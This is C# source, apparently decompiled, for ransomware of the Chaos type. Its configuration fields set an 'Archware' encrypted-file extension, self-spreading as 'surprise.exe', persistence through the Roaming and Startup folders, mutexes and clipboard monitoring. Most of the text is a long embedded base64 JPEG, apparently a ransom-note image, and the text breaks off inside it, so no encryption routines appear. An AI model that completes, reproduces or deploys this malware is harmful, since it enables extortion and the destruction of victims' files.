using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "Archware";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "powershell.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "/9j/4AAQSkZJRgABAQAAAQABAAD//gAfQ29tcHJlc3NlZCBieSBqcGVnLXJlY29tcHJlc3P/2wCEAAQEBAQEBAQEBAQGBgUGBggHBwcHCAwJCQkJCQwTDA4MDA4MExEUEA8QFBEeFxUVFx4iHRsdIiolJSo0MjRERFwBBAQEBAQEBAQEBAYGBQYGCAcHBwcIDAkJCQkJDBMMDgwMDgwTERQQDxAUER4XFRUXHiIdGx0iKiUlKjQyNEREXP/CABEIAYUCpQMBIgACEQEDEQH/xAAdAAEAAgMBAQEBAAAAAAAAAAAABAUDBgcBAggJ/9oACAEBAAAAAOVgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6vdcOAAAAAAAAAAAAAFn+7/wAFQgAAAAAAAAAAAAB+oKD8/AAAAAAAAAAAAAd67H+In9DfwDAAAAAAAAAAAAAA2jbOV3v7d/AoAAAAAAAAAAAAAdI/Qf40AAAAAAAAAAAAADp3bvyGAAAAAAAAAAAAAHSu/fjcAAAAAAAAAAAAANj/AGn+CQAAAAAAAAAAAAHZesfkL3+iP8+YYAAAAAAAAAAAAHQd84E/VWn8FAAAAAAAAAAAAAC5/dP4IiAAAAAAAAAAAAAB2Kdw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABk+PvGLGutKsM2EAfeT6jAJMYMnuIADIY/v4M2EAAErr2lIdlpnXJvLqHds+Ko+tjuNTxa3t2o9BrseXZaPF8ytZh7Bfa5sWmXmLNG2KLoXQaWuyy5sC4rclhzToG001ViYNQ3WDMuOaAADcJ+bYtS0Xf4fmm9H27nHvmTcaLBW7/yXqNHhz2tftWk1i02CmkRKbzfsFdkxavaSqyPssbPcZue3mgdIwfFrp1vn5v2Kqk1PPwAAAAAJEqtAAAAAAC1VQAABk8+AAAAk4PkGTHkxgM+HwBLiAD14AAfW449ippFPs1DaU+fXLW6rbKpn6Rv1aztdu7u01CDQbRLwTvLGTraw1CbcRJt/zXYpsO+1Sz2DmvUdUUWW3+6Pyp67jl0HOgAFvtE3YNb2/VcOHzdKHnvVtdn65uHvKO387i7HY8c6RKiZfrmXYJuo2tFNrt/oaPDs+SZz/aOc7P0rWJUbZueajtN3b8Y6TNw+OYdgh6b0Hn+uAAPXh74XNtqD3wPfHvgJ8AAAD3wD3xteqevFrV+AAAAAAAAAAAAAAAAB7tmL5sa6X5D2jV5VfQgAAAAAAAAAAAub+ftmk/Fvnm/cKgj6WAAAAAAAAAAABO+cHjbNRk4/ufBiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmkQWWT8w/v7+cYADLiTYTPi+ZsKXgxjPJ+MUz2PnwTfjHnrM+TDZ1kMAAAFhO2SBGz2VXJj2cj412ZLy1lxrFzca3cWWu1e4YY8C5i0NrkiyoF9AU159att1H7d1cmBJ+6+HtlXZ6nRAAAAMmMABkxgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP//EABsBAQACAwEBAAAAAAAAAAAAAAADBQECBAYH/9oACAECEAAAAPj4AAAAAAAAAAAAAAAAAAAAADf1XkgAAAAADr6LOprwAAAAACWT1PjQAAAAAAev8gAAAAAAOnp9B5DQAAAAAAnmnsPNgAAAAAAtqkAAAAAAznVLiNnAzvGN9G2oM7a421ANvYbU1z5z09VPYU89pz9OlJZz1nV0bVe2/fPxUt9yb11tTUQBvpkwzjfOmcYyzgbx5NtMuiBqBN6XqylpLXk7a2Xrrbysrr3g65Kqwi5LHo1qezg7M03qJPCwAbYyl358ZwEkYzgMsE8OJYsATeikhm7qzzAAAAAAE8fRBnfnAAAAAAAAAAAAAAAAAAAASXsPZz9Elb3a8vX2VFzwT8c7fn7OTbrj2q7aHyoAG2oMsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/xAAcAQEAAQUBAQAAAAAAAAAAAAAABAECAwUGBwj/2gAIAQMQAAAA+8AAAAAAAAAAAAAAAAAAAAAAEfx32oAAAAAA0er5TtemAAAAAAIkTx33eoAAAAAAeHe4gAAAAADUazzP26QAAAAAAa6FruY9WAAAAAABxvZAAAAAAFluVErKWXVLMUgYczFlCllt2THkAMPjtnY8X6T5l1MPmu11/Nzdbn7DQQej1MOL1SPo4G57Pg9rb0nIdn3YCmCRbUUrhtzWX30sXra4JFFcWajXTLsgELzPUXUj9ry+x1PRxdT0/DdJ0PDb3Vx+p0Ofac9DydZoek0tvZeXY/c5wGHJZdDw7DJZW6y+kWTWlbb6Uutoupdrpt8SXcBB83jTYGo6j1AAAAAADX54E6zHsQAAAAAAAAAAAAAAAAAAAEPipOsn67D0Wmv2Wr1nT8lvYO1g1slava4dVnp0nLTfUAAMd9aBZeVoVoFVCtFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/EAD8QAAICAQQBAQUFBgMFCQAAAAIDAQQFABESExQGFSEiIzEQMDJAYAcWIDM0UiRBczU2UHGQQkNEUVNwcnSA/9oACAEBAAESAf8AoFelfThZ21Ju3Gkr+ZPq7HYDDyulQWc25+I5/SVOo69aRTRG7GnAxppU/SOA+CP5IbRqzYdbe6y85JrCkin9Jfs7xfI7OWYP4Pkq16/ys2sivGrL5VWNy/SHoLFVchetvtqFg1wHiHqn09iPYtt6KaUNQMsAvswyAwvp6vBxt1V+1mrVg7dl9lk7m1hHP6QxOXu4W15VI9p22Ic16uyeaR4rIBSPqQ6xdebWSoV4/wC8esdesrHienbvH6sgVR+lPSIQfqPFxP8A6hTr9ozuOJqK/vsx+lPRv+8uM/5s1+0j+gx3+uX6U9HlA+pMXM/3nGv2jKmcVTb/AGWdv0ph7HiZXHWP7LC5nXrWv5Pp65tHvVxbH6R9GYGtmrlgrkzKa8DMr9UekMWnGWL1BXQ1A85jX09+sa1ec9PIktpixW6z1YQdZ7q7I2NRkBfpD076gdgLRuBUNU2IFgZ/1ueVplRqVpStn8wvs/Z1lPdZxLC/z7la9fYrxMmN9Y/KtR7/ANKY+87G3K91E/Got9XU1PVmA+SUfNDmqXpbWc1DgkWLKRKP0n6S9SzhLBItFM0W/i16uuYDKGF/G2Z8r8LA/wDfgRIygAGSKfpGiEgKQMZEo+sfwRTtyHbFVshtvy1NG6K+6ab4Xtvz/hhbCE2CBSAbci+6EZIoEY3mZ2iGLYlhqaMiYTIlApaa2OEJla9uZfcdLemLHCeqTkIL+EAJhiARuRTERBgajNbB4mMyJR96QEG3IZjeN41IlECUjMQX0mQKBE5GeJb7TqRIduQzG8bx/AazVPFgEM7RO35JLmV3KeouLFlBDM1q8W/3j6v8B1eTxVWG0p+WylkwUTpHTsagkot0LBMrm6EnpmOheYnF9vu8ro5oxKZTes2bfWqrYhRaZwgz65mQ5Txmyebj2LGNK3t4KOMWIrou5zLLUoyrQgQg8pkmEZHffMnvBfZksZUxzPGO7J2OQToMbj7SrfgW3G+uqWzoMdSXQqZC7cOBfJxCslRGi5cKd2ocoXKOulp47JOF5CtUp5LbisZTOsu9kGcnqWyNUMbSrNz1W+6e1FZkbpx9QlPvPtGFIG9S5tUK8VByFB5sR2dbBSKzaAtb1hM/EZ4+k6lat4+w4prSPYKV9rVK325nA7sxOKr3WY1+TPv7JXBpw3+0pu2OiKLAFul4+lCDvWrLAqS0logqCVHj71J8uqssQGsnSxbMzdQ/IGD22C2kK7amN9Q1nRsxTqwFqMZQS5dK9cau2cDvpeGAE5B1+z1eHYhJizFY1NdGRO82aT/csclSGi8BW3tS1QuUdQKpsnzHkpcDvqzjEQmjbpPMq9lkq1OExw5A8ROSObfOQAq+OTFdlzIuNSRbKRG+msr09Tmo+WqO+2Y1jKXtG8mn2wvs5fH7Ox702/CusOxWXLSgKFFCKzcnaYB2B5gv2J1WbYWbMDVrgDCe7HIYhFnGONom+K8rqY/GJylWnOQObYWAiSfQQ2zm79tphXTdMNrEIFxxVMzT/wBma9fEl6fNz3MFvljEkGPpoqos5OwwJfHJSshRGp47Uu7q1gJNTMbjhvxcI7EKGuntKV0KRjZuFZYNBRCAkOECy3HeDZkq9syCC6cP3oELNrj2cWaz1bGrzNhSXkse8oZo8fRdSt28fZcc1uPYLMZSq16jrl04mykWgPqKvjUsr+Iw+ya1eeGrv+Mw2ItR72JI6Z6za1Fi11VRHZiTWlk3qrHtwmDTtBrrxJ69nY+wFoMfdYywhZMmEh7at4uiE9Uijo5BjKr3mtNwulCpZZc6jTZTddx72lCCAWhq9RMQtPbaJhJimOk40nVatgWxu+340DbqYqs063lWe5TeDJ9R18chyfEYfZ0V/g/ITYH2ANXu+OL8n11+m/igx3etVlDyYEG1WLx/gy5brDbS3sg69ZudDL+0aw0mWgfysWFTQyKxbHI8kJxGslkn9WNRWvM6hoqEgxVqsK7uPunIItgMdjcMalm2b9GVxEzBasOou9Sd1gxOnLg5Ei5ZT7Q9pZOtCjqvFKbjVHi8MoWRJr8jmOVcpqsTC2QUrpAJ6qNUGKzCiOINk1+A5xynWa5JYJxFRAzJPrWMznBCyqBtVCUo1guzjyxJWkhar2ZYvTpXj8U7Hy9bbFh4GcYSag5Bc2+EDxPhJ2nhjMwjJZRLHMUHUmn/AFdX/WDWQxajzduyeQrjUiyRMK3kV3U593KBKzaSYAsFZLF1KgPWu1VYzYDNFGrRx3kLY3zYsum7QrWcvYvDk6vglYlhMfklWw9RWeUCdiwhiwtX791vmY/LVV1zEZkWW4bi8oL7IssMvLPe01RYfEpFkSxbbUkOWapo4rrZBcKCgLWEIIVehLEhkJgOgr1uCoYxVnIhYsrvSbNTZr/vV5XcHR5/PsLqylEqarKgsIuOYEXYq18FVqBbU2xFxjGRg2qRk67XHABAt3LEtWqcj2sgeVF4DqL1y1ToTjsihXTXFLk1Mo/sylV2UV5LRV1WX3chWZSPIX0OFdpbZSNCsGWVenJ1vB8mGwxJ25yOVs429WETsM5BmfD89ngwHXxDfVQAtYazTF6gcFoH7NSGXrY861lIvRXhDVZRqRrY3HJcLfFFkmzHuWqnmBNkCTKwiEYi6yMa+hWuLr2vIhwatOybH0kPy9fsEiMZyrImtWO8dY8kL/eTooz6iO86xWOtZJhpk7LwxuYRksoljmJGFJyjVt9m9ZwXCioC1llruFj7SbSOs69ZM6avqaxfMT4lMcvTlqmPlVsg2ATErtBrC2q78hcVk3CFe9BdpVcwA+oTybpmFMYyJmzYy6lWJLNVCTIFEThGrRk6zWnABHPcsBdisd5E2BQVlHBbck/KjVNVzJVzAyj5WrALszkqHetb2KxzFasLSnE0qI3kTZ84jPWQOSxzvaj6rrkSvxmZyAsTWvpeo1lWQvj/AMFUzqapu2/AoLa5Zm5bs2iHjLWEe3/CajKqjmbdWXht7hvWzvWm2mDAye3w/lREjKBAZIp/y4lx58Z477b/AJdSXPLghRsP67TExMxMbTH8ZCQFImMiUfWNSJRAlIzsX0n7iFsnhssp5/h19Pd9ypD38oQk2cY3n85ESUwIxMzM7RD8WirBqtZJQWxGZlKsWuK6bV66FUHfyoxdBlDPYwSMWLb8xTIGT9PrEY3KclMRHsKJbNKMgmchEf09bG8683Ldka1fnICWKxuOe3JAd9RiuowwLpeNDI+PbE6YOVB6LArS1KLeUQlrhAlwrEul91dlgIXUnZ7HYiBotyVa6t9cDBc6q1m3LKaqIjsaUCOrNKuviFW+Nl0s65D2KmHRTPKoG7vx6q+Ic6L8uaFeKcjDtFhFCld72mrwC3HusYpy7VWvXOLEWhEkGWGWQ2ArZFL7KAk2KiJmdo+uhwUdo0jyCRyBR/ToxJHWK5YsrroFxJOYxfGkq++4pamwzr1GJUtaJv5BdVjhgwWODtlfPH8g7IVLhK0lKG9abIvjb3n022Y2lEujxjtEsAn09EW2Y6ckjzomYFWLUteCybfaMVmy5IHKsaBVxu3rwV1NIoXN+gVKUlDQchw8lN1Vo03LWVjKqQbJ2gEYSy2xkKxsUoqcTLZs40AqedUuBZTDOtmvYy1kFezkUpuFET0+pY2zuSif8marY7HtwT7bbqwdFhccjqJdhMK2xcBChmwO7cM8Lq6a2rYLFQ8XNxivGdapXgsinbtGcGtBVgu5NKSesDXFqs2nZdVfGzFFIlptBq10GDMHFsdw0zB2VZUsUbA5jElLK+NAqwW7lwKyWFIq11xiH21WZhgupHCTr/T0d/8AYLVj+of/AKhaPFdNNN2xbWuHKk0iOFGJSizkEottiJBKsT8uw69aGstT5rzrG43HOr5kmX1T0qjgaKlQ+6XZJaliXEZnCO9o1sepy2eQvsSzFYnHsttS/IJYQ1nEQvBa2kCnw4I+hpWpPprsXlISbLkyWgxagQh9++FbuHksPYtmcgnHiYFLgliWWkKrmILtA+dvjltJiqdW7ygluIx0GGsMKoHYuJdXmyWixSWJe2hkF2SQPNgWabKqqbTIZiyrtHVuodOUQZRPagHR9i6ivOxGGMN1gMWLOsfkbGXtux1vYq9lbYWul5nRiJxm3j/+L1aFVFNuUBHZdI5X9/QeFa9TsMjcFuAy1kcRd8i3bUItqkRtF9qm7K18bYx8d3XVBDV1TXXv+m8eTAllWGy4qNhdfGUXM22Xl4YUPPKKuNt1KGPJPOWrtMS7MYyh4cQx1aWi5OIrtRcyNFsCNhlB6wEFlXw2Yruji4bFfcM2QzlUzBRMdNb33hi+fqGhXMZsTcB4D4LqXp3KRZ2FpWK3yqXk+Wjwy42ILdctldaaWTyVJdW6F0NxdhLbLzHCYeGbZPy7dxN1fqmyqdgc6vIaIo/d5Q7+/wBosnarbRVP0m9zBgAU6Dls5il5DRx1BQCBx31mQmzXcUbiDBKdWyyU3mXKNDHtQR9yrNh0twwyRRzPIuMovFvjMIHL6Lf7snQs5V4ZDHj3Jcpe+psLC6SkuEpq4ZleT0kh9kYmOUbxkimYgw/e/nzjj7R+vIfZOdHlG83UzEOrNy1DFlQjsOumUtTYrGyvh8EJLm2JuYzU/wDPQqlCsYVCtUlBqA227zAm76vmGRMEoeM49oLw+SktvdZqlxymLfdyL7yTCaVg+2LHqSRnOZKQLkPb7poJZbwV+tXjm6LSW8L0xOIwcRMbx5O8VbKVvxgEat3YeUDq2eXq1LcNx1Sspg9ZlnygrVaRmJ/wVfXqGYLM3pGYmOQ+/DNQePNjyjnjGzZVHkLnCTkSbE2uicfMLa+3isbGPp1bJ1wJTl5dttllYXASBqUIQCCHb0h8UfC8t9WP57/9QtZJvysJG8EIUh915l61a83HY+jYrtgTB1R2YtHdZ4ibtd1iZetNavFn1HjsefPnXiEDSpsXj+dOkmxeiwQPhzdsvgJN6iMKBcy9OzHtAgkoiWVrCx09DazSS8ODB+o7x+7gjvG/tGZ2v035eKV3Hj3D4ylMBblqv4enDRI6dN4MPWCWGRVZw7TgYkhsgSLy797MKkxVFxEprzj6ljDlavZAIUEV2rAbFR+Ux2HZRDs6EklsZimb7tavWNbZVjlTM6ZZXX9SU77C417CVFypY9+HtNyFvjCULZ1Hja6nNJ1mdqqB7G6C1krtQH4wtrBWTmxGXlE5K5Nbj1dnu/MVJofMi+L9p24lbvVvDjH49TBTLO1p/kq9ltUiNM7EQEG/56vcrVKT4Stk3XhKjP8AhZba2qiqzaRTM9Zfqb6+6NMw70BM2LNVTYDl0IxTnICyx6K6jmYCfZFzzk4+BGWuiJVMYC8wS6DQ0wmIau1i3Vq8Woch6efAijCWeCGvfWQDlixZKpvo331rIbGNWzqti3WE+STUoTJcRPG4Am3rFW8Sw6ksPZeLe57krYmRUPJjpqMxbaltops1TKfiydSKV59cJ3XEwQT+iMcxSr9Jr/5YPAi1lcdkYv3TJDWQRm3tyVaxbrYizUWbkxTBM6qbovelqTf6lAtlkYMyicwXKd5xtj30f9h53/51NZejderCtShjVzQQEau/Bfq1pKJbWxDEt0cqbiMQasSN0FLNR6qOe/MrU2n4xjjWoWnFDxxeUpnQ77MMU2a99zYx6q3snw0E/tic98N1apnclVa4H+ivKs9XR5DOr+xVh6N+h7F7/XUGcH2Qc899+QkQ78SmN42nUEUQQwU8Z+sXckR+H4j2r4U1JPW8+/3/AF+ulWH15mUONcz9ddjOfb2Fz335d7u3v7j7frzVcPyk2bXKz1ly4vcyy5thxbsYUkU//vEAJpgsI3IpiIg65glbz2iGTMDH2cCgBZt8MzIxK67WOBAx8ZRExokMFUOnbhJcd9SJRAlIztP0lYE1gKD8RlAxohkCIC+oztP34ATDBYRuRTAxH2LQxoMMNtg48vtYsllAl9eIlqYmPdMbf5/YSDBC7BbQLJmBjSkMcSxAfxnC4njM8vp8Me/+EFGznwHfgMmWgqvOa8CuZ752Xoq7g7+QbdJcGaUo3HC1juU7+6aVqJrDKZ3ePJWk0rFg1rWEcjHkMHXasZMojjB8N2UrSmGliZgwX2FAV2mIHERAkUjBez7femsK4JrR5LhNGw8GMXAcQ/FoKdg5EYD6r7N/Z1yS4Arn8smxqVmIA2R+A5mBmK7CT3/Bw3mNeJZ41i6p2sTMK0VdwdfINuczA6nG2oaSflcxGSLTq7a8iLR25RyGfzFQxXaqsOdhFoFM2LEMp0EQzfqhm4k9KorOmIFlkeZ6YVYq5IdaA7G28OWxEW8h1MFfPnFdkWlRlF2GOghgAgj8ukVEq/KBcXGBO+ykSo8UR2Lr2ivaDppiyxHy4eIwb1+TjiY4WGoolrH3q8FcfUOA5q4qCbdcjE0WVq+ZBv0FvGzMmXu7I7CCtclFe6QnAvM1SOodVNlweYr+cc1jK3XTVhImDGSSocWSei58uv1cRljYKgSoq2GNGN609q5XcrAQMNwTW4KgUWRSqqhK7ANOHOKZayu96d7kBV2+WDchVV48IcMz2I7ipOSu5ZnmIJPlHJtul4IoVwmJXCy029TUhnW8TcItFZeWEOxxjYHpAkES7VkbCaZMnm4ZOGaC7WW5jGWFGuTkkDWv1ZCvNlkS3ZcM0N6rMip0wVYaqY4Ze0l/WKYCYgjKCqWaIzBssRtKwBgKuINhnYdyaVZIrOzcE0sSkQATstZIour6aKjdsS1PGJfcWNJqYeJ2ShYmdC1C1VxOxxFd1TZEb6mJknmBO2dEatOrHfrOM+xe4y0XZGv28gle8JfwOLyzlIdwjMVOIlYvBFXqU8JsSa4aypYFDbptITkksGNDfqwms0xHtUlowtjKlxVmQeCTcKSkaDFotgxhbBEH762Qq91FT2fJWtc8q9lIWcYwi2FYTB6pvqihIWC/BZl0gNypb3Ij6XSlyZ0kKhAio+0uBF7DIu9VU7Nljgc1kQCxbYqy/INVPEbCN4HyK7a/i90BJVlDyTaVTV1BZ3YKnTB331n1qcp9x8mk1YWAikFbguZJxzJefQYUK2JYIck1G0kNTUbFlcdTGTINNB2rs+VUgXKbAlaYrpqVlM7OqD3P80Rkc8jKSn/z++5Fx4cp4777f9OT/8QAQRAAAgECBAMEBggDBgcAAAAAAQIRABIDITFRIkFhEBMycUJSYIGRoSAjMEBicoKxg5LBBBQzUJDRQ2NwgKKy8f/aAAgBAQATPwH/AEChqx9UUcSQi/7n2U54mKf96O59k/PxGt8Rv9h7IMJFzHX3RWEoT3GN+38R4jXmZ9kDmrDrWH6XmezzNfmOfy9lPJCa8lPsp/DNfp9lPNCK819lOk51+U5/L2RGV5bSTtQJKso8+38UWmuqmPZCYmNjTGWI2Hb/AOwr/mDX2U3HMe+vUxBv/WjyI9lNbG9YV3bKHG+Y1H/XkCT2EQfo2GI7O7a2PP6QGQnSftDqCK5C7T7HlcBMfS3Jo8iPtiNQedb1GRjsPMfQYRkfufUVy/vJMd1/Nn5Uq3YmLiHiMafGnSHw3O8aio/FE0EktM6D3UcjHWsK6279qEHD/vGIAGaPwma7w5z2BOBUYTmZ1p8K1MRV1tzJHvrCSX4DE5mIqIJRtxuKGj3EgT5Vh4c92HHpSaXDuFsrxiedBPrcRomAJyrEW18NiJExyO9RdA8hWLhhZVjFywTXmaXC+qU8rs6AuJkkZUqA4uJb0mAKZbXRwQbWFLhzhIWOQYzNdQzUuGDh4RcSAxmT1ilW4sTPh02oYY769fECJjLeoglH3G9IlzE7CsRYdHHlrrQw/qruSkzNItzu4zIHKBvTLaw4AIIo6CFJp8O1MRF8Vhnl1rCQMVTQM0nntSiblxPBaN2rEUK4xG00yINWDubw3gmZ99YS3OWdjvoKcWt8KGECZsPDrpWCoZrJi4zEVEHIwQRuKInKYNWDvcRyJtCzWIsNhsgkhgPlT4I+IzruuHDHSDnWLhhZVjFywTWHhzE7513YVSCnimdT2c8uJPkaHPvVkn+eicg+N9Y0+Qp8O1cRU8VmZ+dHPNbmmmSAtpjh36VjKFYB9GEE5djcxjYd3/jFEaZDP50cEWmNSudd2FWDhjOZ1P3GfR7uJrFa1cRXABEnmIrCNyouFoJHMzV4vGd1pXWaB1SHz8uxHIAbmCBUT3boZVo23pccG6NhrPYM1KwPlWC6WsSMiAnLac65rL5TQ5NccjR1NrGYpTOYTMUWhC3CYn3Uzju8QOIIDaSKwmvXDXDmMxzM1if4YxI4S3Saw3UjJx6uU176L8awc1s1najqVBasVrA6YmeRPMUhlEjhAnmd67wXATJFupO1HUgMaxTho+CYgg3CddK5uADLVzF1sT50OTAnKseLYnitLZXUrXBFy06VPDbdrWI4UYiYmxOUiKwzIEoAIptM8MijzYjIVjHDQqU9IX6qaMd0ThejJGkaGsIox4OZsq8XxdMW6zWLiKFxELTMPkRWH4L44rek1iMElAhUwTtWLiBPAcmWdRnSeEvimSAeYFese8GQrFtsxBbaVltDS4ihcJhuyCJNYBBJwo9OzKZouGUMRwnEHITWG6keMH0cpocmE5U2IAyOqhTcNQBSGVPUU2hxME+H9QptAwbvAaAkqji0GOlYbYZbEBygBRNEwBwGm8KuDIu6GsJkYtGYPANOzEa1W7vBgiTz4qV5XDlQBmP3rCZXxSvO8r6Mb0HF4ZEAIK/5N5UOUn/KhiWZ/Ol0AUQB7gPuwzNcp+8IpY/L7A5Hs3+xjXy+yRS0D3ffBQRmg+qWGU0VZ3YDK6BoKTwupBzr+GKg+IehfpdTKWZ2GoVRtRRxy8f6aCxeTMESJyq1m8YkXR4afMKZgARqTyoAq9zbg0chS4bLn0nWrWtD+qX0msTlJjlrVjTePQs1mkBAcNlz060obRfFYx8UdhB8XqFtLqeSQwEwANahizMhiIH70UZ2tOha3SanhdALgQetKCBO2dbPAk1DQSOV2gJq17kAnh4d6Ks7YkakAcutJowGR10I7CrNHLiI0pzlAMUFKFGOYyPI0ysbbtAzDIGvdRRzbwnhyHOiCzEl+SipjD7qJvM6AUEZGUExdxairWfJ/WjShplS7hrbfOvQtC3TRUuz26kAchvSZqwxBwsK/j176glnIJEZaedMCYu0DsPDNFS5OINQANqsxMuMcenuqxmZ+oXah4WUgkftQV4DBDz520ARP81KHBJGH/hmP/lWM7lPWIXQUDwOttwI+FIDCttnrQ9Fk5GmMDCwvWarGRrBqwu1AochcVz+FDZxPYNWcr3hB8hlQURhMFuUptEVlF93F3s8raH/AA/7Ldkf1/t9v0BoOtpU5769KBFyNh7jY70CIDYpLWz0rnAQUMPDi3UNdOtAgNxtcHA5g1cM3ZZC+dE586n8AqQO8VRBA6ipllAuzPnUgcQ86w8u9w9WazkR86vFlhM3TvRyJF5r+GK1tuxGGdJh4YBUiOEzzroDNd2mmoJJORFDcoK2nFNBhOEyqFKttSnIuqGY+PZ7lqcvFU/moEXqbiQ0bGrpXD7z0SRsBJ7MVFe3EniDFvDHIVvxrXMgE1cLFVvW2I2rfKpzsCkTX66xYKXsTAboaTDRWYE6LGtD8lD8oo+lesQP1AGieLNrp/lrEw1fEU3SCJ9E1gxaq6xw+dbfX1766941HDQlctHJ0I61w2X+sIMr51dNxDqxUHnFYsOcIDSAcvfWHAUND7ZUcpZsMgCtq/hUpF2G+GIII260p4b2V2iek9h9E4fj+K0xhRYRYvSQKYicR8RbQFA/egwlGDk5zyM60HAH1a55nsHqYmFYfhQYEYrMLVt3ma5kclHVjlSwCoy7sZ+gBS6TzjpP3jBIke5taxSC+IwyGmgH3Powg/f2IsTDJzt6n6XpANqvl7UPixi/DfpWO9t8a2jPKg0o4OhB2rDxAXw59boOdYD32tsaxsS24NtWoI7liCNxWO9oZtl3o4gF3ASrLutd4O6UdWpDfhvHiXoa3RxcvyPsT0BpVJVkOd07VhgtZiIcwY0muahySqnqBXwr9RpAWg7ZaUM4cYLmPdNBsScPEumCEPPWpMx3bWjizmnvR2wxOYtgmKlyWYLHpmvxDDHsVebfhSMV/apzobVyMUpK8S66diMVn4VOfxq43fGsRyZiup/78uprmY1Pb1Gv715iaBBzgH+vZvXU15fb9T2kx4jHPt6MJFefZzMc+zlceVEgfR2Ar1s4rY7fKvLOvWBpnVZEx6RG1BgwuieVfhiZpmCiQJ1NK6tcPMGKbERSPcxFEgCzck6UhDAoupBGtb260XUGRsDmda9aDFbkGK71IUDWc8qBBBG4IyP3noDW0tNFfAVUopjaeKiGIifDMTREAcfllw0AYJGHafnRGSxhKrfGImriSlqwcoESdc86aeB2HC3lS6RdPvgVbxKbwW131miv+ILV0y88qt8LYHgA/MNajYkmreFLiduW21KvjUXTB+VXEkIBkuYEeVEas3Db/WgvErrEnTzpJ8JCxr5UsqUIXKcss+dWzIVYaSRnWhVbvRyOdEm4Ndm9sa++s2MG2OQg1BlWXxE5Z551EGJkUFnuxBicvdFFfVxSc/dVvpqyk++gxJg6DMCPKmmMsELkAM86uKWW+JSYOdIMrTbbryyphkjt4TSr4hxSAelGfDvTLuyFRly1ocSgXZqDAkRQlzLjhGaiOlFclxicycvnQXxQD08qIlWYmsOU4sRtZz5Vik+JJBzA5615qRUH6vFX+h51txsf616wVNPecqxGLTfxAyB7qE2kWjnHOsBiLF8yOURWeTswJWiDAZGJg/Gkm0O9sAfCoyVmjToaYElAQokfCi0grhm3SMpGdGboOJOWVJcNWBF2WtQQJczAnl97Jn7flP8Apy//xAA9EQACAQMDAgMECAMGBwAAAAABAgMABBESITETQRAiURQyYXEFICMwQlBigSRS0RVwkaGx8DNDYHKCssH/2gAIAQIBAT8B/uGVS7BV5JxVwsVpbrFpVpWHJ/KIIjPKsYOM96urY2zKC2civoyLVK0hHujb5mrqXqzu/bOB8h+UI7RsHQ4IqWaSZtUjZNWR02U7Z/m/0/K7UE2Fxj9X5TDE00ixryaubZrZgGIIPBr6NIeGaE/7zTKVZlPIOPyiORonDpyKmnknYNIas5uhOrH3Tsa+kYNLiZPdf/X8rF5J0OgwDL8fygDJwOawfTxKOuMqRn4UyMvvKR8x44+qAScDmtDZK6Tkdvl9UqVxkYzv44ONWNuPr4POK0t6H1rB3Phg4Jxt90CVIYcjetccxCaV3TqBezSGmt4XUaEXrBkMig+6O9XfRXpxxIo2yW/euvH1elk55BY7K2nbFTLOrKJ877jJzUcVvJJIDGgj1FNu2O5OakEBikUKoKIhBHJJ5qPoraiVkV3AUYY+pNaYmUAQoQhkCb8tnYc1JFGbqBPIpYDWPwg1dQRLNagKBr2dRt3+Zp4IELmWFF0l9C594Ad6RI/I/SRY/KwfO+rI2qVY9bSSKqEs4BH4lK810bVcnpjZWKE4w2B896n6JjfTGilQjZHq3NW9vAbYGQKc75+ORtnNdK2fWUjTWjuqL2bHGauNLXluGCgaUDAcCoVt5cSdFdWDhBxsfnTQ2eg6I/Lnc7ZU545rpjKRtbLjqNpA7jGx5qEBLq4QJG50tgdv2qeJBAxESBAq6Hzux71ClvotVKKWZWY+uQdhQS3UlxCF0surXx+2DRt4nadnSMAltx222PPeiYjBcwxQx5UJ8z8aswvUkt5TgOMfIjenkt5ArkgCRhGw/ShqURLLDEI9Kuw1jsQDt3NFIHtmlWEb6s4/D6d6tEV4pVIzk4Hz0nFdCKNW+yTUqISW3GcbjnmvpHHtLEKoG2Md/j91huQD9yGKkMDuDmndnYuxyScmt6GWOBkmt+PHfmsE+OT4FWAyQcfVwQASDv8AU6r9MRbaQc8Vv8awfuIwGdFY4BIBNdBcy4tPd9wZPm35oRxr9n7q+fPwyFzT21sNRSIlxnSm/mqNVePeDp4SXgnn0o2lszShUAMbkAZ9/wAuauIUSW2HRK61BZBzzTWsS+7AHJYeXJ8q+prp2yZURB8IzBsnfBoWtr520Eg44ydIK57VZQQyJI7qXIYDG/H7U8VtGWAiyBEG3J5JxXs0AbDwYQMNLZ98YqzWOWS4yNK6eAf1Co44I+rJGgGnqpzzgZp7ZCrhY/wKUkz7zHtVnAsjtrAIGBg57n4V7JbZERGMrIdWdxpNXUQigkUQ6B1QAf5hR6awo3QXBt9/idVG0tgGbRkHPGTp2zV5FCnWWOPHTkC5zyCKS1tWQSEgZXXjPZeRUscVvEJY1yQFw2Dg5G9XH/AH/cn/AKUkFqTIOlnToGN